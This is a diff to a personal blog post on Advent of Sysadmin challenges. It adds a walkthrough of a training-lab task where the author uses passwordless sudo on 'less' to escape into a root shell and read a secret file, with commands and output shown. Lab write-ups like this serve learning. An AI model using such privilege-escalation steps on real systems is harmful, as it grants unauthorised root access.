@@ -14,7 +14,7 @@ Advent season is here! And that means advent challenges as well!
 
 After a [disastrous attempt](https://github.com/hatedabamboo/AoC2024) at Advent of Code last year, this year I was very happy to see that Sad Servers started an Advent challenge of their own -- [Advent of Sysadmin](https://sadservers.com/advent)! At last, a challenge I can (hopefully) progress further than task 3. And this means more challenges for us to tackle. The Advent will consist of 12 challenges. To keep things slightly more interesting, I will publish the solution to each task the day after it's released: for example, today, on December 2, I will solve the task from December 1, and so on. Have fun!
 
-*Task from December 4 is now available!*
+*Task from December 5 is now available!*
 
 <!-- more -->
 
@@ -399,6 +399,83 @@ OK
 ```
 
 The last two commands (before `docker run` and `check.sh`) were just to double-check that the image we found is correctly tagged and will be used to spin up the container. Way to go, my friends -- another puzzle solved!
+
+## La Rinconada: Elevating privileges
+
+::: note Description
+
+    You are logged in as the user "admin" without general "sudo" privileges.
+    The system administrator has granted you limited "sudo" access; this was intended to allow you to read log files.
+
+    Your mission is to find a way to exploit this limited sudo permission to gain a full root shell and read the secret file at */root/secret.txt*
+    Copy the content of */root/secret.txt* into the */home/admin/solution.txt* file, for example: `cat /root/secret.txt > /home/admin/solution.txt` (the "admin" user must be able to read the file). 
+
+:::
+
+Oooh, hacking, I love that! (And it absolutely has nothing to do with the fact that I'm currently watching *Mr. Robot.*)
+
+To start: we're dealing with limited sudo access to log files. Let's see what exactly is meant by that:
+
+```bash
+admin@i-0adfc7a1f5cd64cfb:/var/log$ sudo -l
+Matching Defaults entries for admin on i-0adfc7a1f5cd64cfb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User admin may run the following commands on i-0adfc7a1f5cd64cfb:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/less /var/log/*
+```
+
+The last line tells us that we can execute the `/usr/bin/less` command on any file in the `/var/log` directory with `sudo` and we won't be prompted for a password. Nice! That means we'll be able to use a famously flawed [ability](https://gtfobins.github.io/gtfobins/less/) to spawn shells inside the privileged `less` command.
+
+```bash
+admin@i-0adfc7a1f5cd64cfb:~$ cd /var/log
+admin@i-0adfc7a1f5cd64cfb:/var/log$ ls -l
+total 508
+lrwxrwxrwx  1 root root                39 Aug 14 04:26 README -> ../../usr/share/doc/systemd/README.logs
+-rw-r--r--  1 root root               960 Sep  7 16:34 alternatives.log
+drwxr-xr-x  2 root root              4096 Sep  7 16:35 apt
+-rw-rw----  1 root utmp                 0 Aug 14 04:25 btmp
+-rw-r-----  1 root adm              13952 Dec  5 17:47 cloud-init-output.log
+-rw-r-----  1 root adm             405750 Dec  5 17:47 cloud-init.log
+-rw-r--r--  1 root root             31307 Sep  7 16:35 dpkg.log
+drwxr-sr-x+ 3 root systemd-journal   4096 Sep  7 16:29 journal
+-rw-rw-r--  1 root utmp            292292 Dec  4 21:39 lastlog
+drwx------  2 root root              4096 Aug 14 04:26 private
+drwxr-xr-x  3 root root              4096 Aug 14 04:26 runit
+drwxr-x---  2 root adm               4096 Sep  7 16:29 unattended-upgrades
+-rw-rw-r--  1 root utmp             23808 Dec  5 17:47 wtmp
+admin@i-0adfc7a1f5cd64cfb:/var/log$ sudo less alternatives.log 
+[sudo] password for admin: 
+sudo: a password is required
+```
+
+It wouldn't be as fun otherwise, would it?
+
+```bash
+admin@i-0adfc7a1f5cd64cfb:/var/log$ sudo /usr/bin/less /var/log/alternatives.log 
+root@i-0adfc7a1f5cd64cfb:/var/log# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Great, we did it! *We're in!* Now for the easiest part of the task.
+
+```bash
+root@i-0adfc7a1f5cd64cfb:/var/log# cat /root/secret.txt
+Sudo_Esc@pe_S3cret!
+root@i-0adfc7a1f5cd64cfb:/var/log# cat /root/secret.txt >> /home/admin/solution.txt
+root@i-0adfc7a1f5cd64cfb:/var/log# 
+exit
+!done  (press RETURN)
+admin@i-0adfc7a1f5cd64cfb:/var/log$ cd
+admin@i-0adfc7a1f5cd64cfb:~$ ./agent/check.sh 
+OK
+```
+
+And that is the most complex task so far done!
+
+Out of the proposed 15 minutes to solve this task, I spent almost an hour trying to figure out what to do. The wording of the task made me think that somehow I could use `sudo` with certain commands without a password. Turns out, I was absolutely correct in the assumption, but not in the way I approached the challenge. I was trying to execute, with `sudo -n` (`-n` for non-interactive), every command in `/bin`, `/usr/bin`, and `/usr/local/bin`. What I should have done instead was read `sudo --help` to find the `-l` key, which shows the list of actions that are allowed for the current user with and without a password. Every day we learn something new! The rest of the task was slightly simpler. Figuring out what to do with `less` and conditional root access was on the first page of search results for "less privilege escalation." And the rest was just a technicality.
 
 ---
 
